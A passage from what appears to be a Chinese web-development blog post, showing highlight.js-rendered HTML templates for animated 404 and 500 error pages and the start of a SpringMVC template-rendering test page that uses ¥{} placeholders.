class="hljs-name">style</span>&gt;</span>        html&#123;background: #fff;&#125;        .error .clip .shadow &#123;height:180px;&#125;        .error .clip:nth-of-type(2) .shadow &#123;width:130px;&#125;        .error .clip:nth-of-type(1) .shadow,.error .clip:nth-of-type(3) .shadow &#123;width:250px;&#125;        .error .digit &#123;width:150px;height:150px;line-height:150px;font-size:120px;font-weight:bold;&#125;        .error h2 &#123;font-size:32px;&#125;        .error .msg &#123;top:-190px;left:30%;width:80px;height:80px;line-height:80px;font-size:32px;&#125;        .error span.triangle &#123;top:70%;right:0%;border-left:20px solid #535353;border-top:15px solid transparent;border-bottom:15px solid transparent;&#125;        .error .container-error-404 &#123;top: 50%;margin-top: 250px;position:relative;height:250px;padding-top:40px;&#125;        .error .container-error-404 .clip &#123;display:inline-block;transform:skew(-45deg);&#125;        .error .clip .shadow &#123;overflow:hidden;&#125;        .error .clip:nth-of-type(2) .shadow &#123;overflow:hidden;position:relative;box-shadow:inset 20px 0px 20px -15px rgba(150,150,150,0.8),20px 0px 20px -15px rgba(150,150,150,0.8);&#125;        .error .clip:nth-of-type(3) .shadow:after,.error .clip:nth-of-type(1) .shadow:after &#123;content:&quot;&quot;;position:absolute;right:-8px;bottom:0px;z-index:9999;height:100%;width:10px;background:linear-gradient(90deg,transparent,rgba(173,173,173,0.8),transparent);border-radius:50%;&#125;        .error .clip:nth-of-type(3) .shadow:after &#123;left:-8px;&#125;        .error .digit &#123;position:relative;top:8%;color:white;background:#1aa094;border-radius:50%;display:inline-block;transform:skew(45deg);&#125;        .error .clip:nth-of-type(2) .digit &#123;left:-10%;&#125;        .error .clip:nth-of-type(1) .digit &#123;right:-20%;&#125;        .error .clip:nth-of-type(3) .digit &#123;left:-20%;&#125;        .error h2 &#123;font-size:24px;color:#A2A2A2;font-weight:bold;padding-bottom:20px;&#125;        .error .tohome &#123;font-size:16px;color:#07B3F9;&#125;        .error .msg &#123;position:relative;z-index:9999;display:block;background:#535353;color:#A2A2A2;border-radius:50%;font-style:italic;&#125;        .error .triangle &#123;position:absolute;z-index:999;transform:rotate(45deg);content:&quot;&quot;;width:0;height:0;&#125;        @media(max-width:767px) &#123;.error .clip .shadow &#123;height:100px;&#125;            .error .clip:nth-of-type(2) .shadow &#123;width:80px;&#125;            .error .clip:nth-of-type(1) .shadow,.error .clip:nth-of-type(3) .shadow &#123;width:100px;&#125;            .error .digit &#123;width:80px;height:80px;line-height:80px;font-size:52px;&#125;            .error h2 &#123;font-size:18px;&#125;            .error .msg &#123;top:-110px;left:15%;width:40px;height:40px;line-height:40px;font-size:18px;&#125;            .error span.triangle &#123;top:70%;right:-3%;border-left:10px solid #535353;border-top:8px solid transparent;border-bottom:8px solid transparent;&#125;            .error .container-error-404 &#123;height:150px;&#125;        &#125;    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-floud&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: center&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-error-404&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit thirdDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit secondDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit firstDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span>OH!                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;triangle&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;h1&quot;</span>&gt;</span>很抱歉，你访问的页面找不到了<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/lib/layui/layui.js&quot;</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">randomNum</span>(<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">9</span>) + <span class="hljs-number">1</span>;</span><span class="language-javascript">    &#125;</span><span class="language-javascript"></span><span class="language-javascript">    <span class="hljs-keyword">var</span> loop1, loop2, loop3, time = <span class="hljs-number">30</span>, i = <span class="hljs-number">0</span>, number;</span><span class="language-javascript">    loop3 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">40</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop3);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.thirdDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">4</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.thirdDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript">    loop2 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">80</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop2);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.secondDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">0</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.secondDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript">    loop1 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">100</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop1);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.firstDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">4</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.firstDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div></li><li><p>我用的比较骚的500.html</p><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;*&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;apple-mobile-web-app-status-bar-style&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;black&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;apple-mobile-web-app-capable&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;yes&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;format-detection&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;telephone=no&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/lib/layui/css/layui.css&quot;</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;all&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>        html&#123;background: #fff;&#125;        .error .clip .shadow &#123;height:180px;&#125;        .error .clip:nth-of-type(2) .shadow &#123;width:130px;&#125;        .error .clip:nth-of-type(1) .shadow,.error .clip:nth-of-type(3) .shadow &#123;width:250px;&#125;        .error .digit &#123;width:150px;height:150px;line-height:150px;font-size:120px;font-weight:bold;&#125;        .error h2 &#123;font-size:32px;&#125;        .error .msg &#123;top:-190px;left:30%;width:80px;height:80px;line-height:80px;font-size:32px;&#125;        .error span.triangle &#123;top:70%;right:0%;border-left:20px solid #535353;border-top:15px solid transparent;border-bottom:15px solid transparent;&#125;        .error .container-error-404 &#123;top: 50%;margin-top: 250px;position:relative;height:250px;padding-top:40px;&#125;        .error .container-error-404 .clip &#123;display:inline-block;transform:skew(-45deg);&#125;        .error .clip .shadow &#123;overflow:hidden;&#125;        .error .clip:nth-of-type(2) .shadow &#123;overflow:hidden;position:relative;box-shadow:inset 20px 0px 20px -15px rgba(150,150,150,0.8),20px 0px 20px -15px rgba(150,150,150,0.8);&#125;        .error .clip:nth-of-type(3) .shadow:after,.error .clip:nth-of-type(1) .shadow:after &#123;content:&quot;&quot;;position:absolute;right:-8px;bottom:0px;z-index:9999;height:100%;width:10px;background:linear-gradient(90deg,transparent,rgba(173,173,173,0.8),transparent);border-radius:50%;&#125;        .error .clip:nth-of-type(3) .shadow:after &#123;left:-8px;&#125;        .error .digit &#123;position:relative;top:8%;color:white;background:#1aa094;border-radius:50%;display:inline-block;transform:skew(45deg);&#125;        .error .clip:nth-of-type(2) .digit &#123;left:-10%;&#125;        .error .clip:nth-of-type(1) .digit &#123;right:-20%;&#125;        .error .clip:nth-of-type(3) .digit &#123;left:-20%;&#125;        .error h2 &#123;font-size:24px;color:#A2A2A2;font-weight:bold;padding-bottom:20px;&#125;        .error .tohome &#123;font-size:16px;color:#07B3F9;&#125;        .error .msg &#123;position:relative;z-index:9999;display:block;background:#535353;color:#A2A2A2;border-radius:50%;font-style:italic;&#125;        .error .triangle &#123;position:absolute;z-index:999;transform:rotate(45deg);content:&quot;&quot;;width:0;height:0;&#125;        @media(max-width:767px) &#123;.error .clip .shadow &#123;height:100px;&#125;            .error .clip:nth-of-type(2) .shadow &#123;width:80px;&#125;            .error .clip:nth-of-type(1) .shadow,.error .clip:nth-of-type(3) .shadow &#123;width:100px;&#125;            .error .digit &#123;width:80px;height:80px;line-height:80px;font-size:52px;&#125;            .error h2 &#123;font-size:18px;&#125;            .error .msg &#123;top:-110px;left:15%;width:40px;height:40px;line-height:40px;font-size:18px;&#125;            .error span.triangle &#123;top:70%;right:-3%;border-left:10px solid #535353;border-top:8px solid transparent;border-bottom:8px solid transparent;&#125;            .error .container-error-404 &#123;height:150px;&#125;        &#125;    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-floud&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: center&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-error-404&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit thirdDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit secondDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clip&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;shadow&quot;</span>&gt;</span>                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;digit firstDigit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span>OH!                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;triangle&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;h1&quot;</span>&gt;</span>o(╥﹏╥)o很抱歉，系统错误咯~~ 赶紧联系管理员吧<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;h1&quot;</span>&gt;</span>Message:￥&#123;detail&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;h1&quot;</span>&gt;</span>StackTrace:￥&#123;stackTrace&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;h1&quot;</span>&gt;</span>Copyright@luelueking<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/lib/layui/layui.js&quot;</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">randomNum</span>(<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">9</span>) + <span class="hljs-number">1</span>;</span><span class="language-javascript">    &#125;</span><span class="language-javascript"></span><span class="language-javascript">    <span class="hljs-keyword">var</span> loop1, loop2, loop3, time = <span class="hljs-number">30</span>, i = <span class="hljs-number">0</span>, number;</span><span class="language-javascript">    loop3 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">40</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop3);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.thirdDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">5</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.thirdDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript">    loop2 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">80</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop2);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.secondDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">0</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.secondDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript">    loop1 = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">100</span>) &#123;</span><span class="language-javascript">            <span class="hljs-built_in">clearInterval</span>(loop1);</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.firstDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-number">0</span>;</span><span class="language-javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.firstDigit&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">randomNum</span>();</span><span class="language-javascript">            i++;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;, time);</span><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div></li><li><p>我用的比较骚的用来测试模版渲染的first.html</p><p>注意模版为¥{}的类型</p><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>springMVC模版渲染测试用例<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!--注意这里的¥&#123;&#125;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>I&#x27;m ￥&#123;name&#125;,I like ￥&#123;hobby&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;loader&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;track&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mouse&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;face&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ears-container&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;eyes-container&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;eye&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;eye&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;phiz&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nose&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;lip&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mouth&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><span class="language-css"><span class="hljs-keyword">@import</span> url(<span 